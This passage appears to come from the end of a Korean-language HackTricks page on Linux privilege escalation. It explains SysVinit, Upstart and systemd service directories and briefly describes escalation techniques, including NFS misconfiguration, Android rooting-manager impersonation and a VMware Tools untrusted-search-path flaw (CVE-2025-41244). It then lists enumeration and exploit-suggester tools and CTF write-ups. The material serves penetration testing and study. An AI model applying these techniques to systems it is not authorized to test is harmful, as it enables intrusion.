`/etc/init.d` 디렉터리에는 System V init(SysVinit)의 **스크립트**가 있습니다. SysVinit은 **전통적인 Linux 서비스 관리 시스템**입니다. 이 디렉터리에는 서비스를 `start`, `stop`, `restart`, 때로는 `reload`하는 스크립트가 포함되어 있습니다. 스크립트는 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 시스템에서는 `/etc/rc.d/init.d`가 대체 경로로 사용됩니다.

반면 `/etc/init`은 Ubuntu에서 도입한 새로운 **서비스 관리 시스템**인 **Upstart**와 관련이 있으며, 서비스 관리 작업에 구성 파일을 사용합니다. Upstart로 전환된 뒤에도 Upstart의 호환성 계층 덕분에 SysVinit 스크립트가 Upstart 구성과 함께 계속 사용됩니다.

**systemd**는 최신 초기화 및 서비스 관리자이며, 필요 시 데몬 시작, automount 관리, 시스템 상태 스냅샷 등의 고급 기능을 제공합니다. 배포판 패키지용 파일은 `/usr/lib/systemd/`에, 관리자가 수정하는 파일은 `/etc/systemd/system/`에 배치해 시스템 관리 절차를 간소화합니다.<sup>[[21]](#references)</sup>

## 기타 기법

### **NFS 권한 상승**


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### **제한된 Shell에서 탈출하기**


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### **Cisco - vmanage**


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 syscall을 후킹해 userspace manager에 권한이 있는 kernel 기능을 제공합니다. manager 인증이 취약한 경우(예: FD 순서에 따른 signature 검사 또는 취약한 password 방식) 로컬 앱이 manager를 사칭해 이미 rooted된 기기에서 root 권한을 얻을 수 있습니다. 자세한 내용과 exploit 정보는 여기에서 확인하세요:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations의 정규식 기반 서비스 탐색은 프로세스 명령줄에서 binary 경로를 추출한 뒤 권한이 높은 컨텍스트에서 -v 옵션과 함께 실행할 수 있습니다. 허용 범위가 넓은 패턴(예: \S 사용)은 쓰기 가능한 위치(예: /tmp/httpd)에 공격자가 준비한 listener와 일치할 수 있으며, 그 결과 root 권한으로 실행될 수 있습니다(CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

다른 discovery/monitoring stack에도 적용할 수 있는 일반화된 패턴을 확인하려면 여기를 참고하세요:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel 보안 보호 기능

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 추가 도움말

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc 도구

### **Linux 로컬 권한 상승 벡터를 찾는 데 가장 좋은 도구:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 옵션)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux와 MAC의 kernel 취약점 열거 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (물리적 접근):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**추가 스크립트 모음**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI 권한 상승, zip -P 자격 증명 재사용)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron으로 실행되는 monitor용 위조된 .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch 우회 (sudo env_keep PATH 하이재킹)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [기본 Linux 권한 상승](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux 권한 상승 가이드](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [공격과 방어: 2016년 Linux 권한 상승 기법](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [아무도 command execution을 예상하지 못한다!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux 권한 상승)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – 실습 문제 풀이 - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux 권한 상승 팁과 기법](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux 열거 및 권한 상승 도구](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket이란 무엇인가?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS 알아보기](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux 권한 상승](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux 권한 상승](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux에서 ACL 관리하기](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts를 통한 Redhat/CentOS root 권한 획득](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd란 무엇인가?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (로그를 통한 bash 산술식 injection, 전체 공격 체인)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash 매뉴얼 – BASH_ENV (비대화형 시작 파일)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR 심볼릭 링크를 이용한 권한 상승)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron 복사 → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – 이름만 지정하면 VMware가 권한을 상승시킨다 (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot 권한 상승 취약점](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 및 CVE-2025-32463 Sudo 권한 상승 취약점](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC 저장소 디렉터리](https://peps.python.org/pep-3147/)
- [32] [Python importlib 문서](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit 이슈 #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec의 트윗](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux에서 password 로깅하기](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - logrotate 경쟁 조건의 상세 내용](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 문서 – `site` 및 경로 구성 파일](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
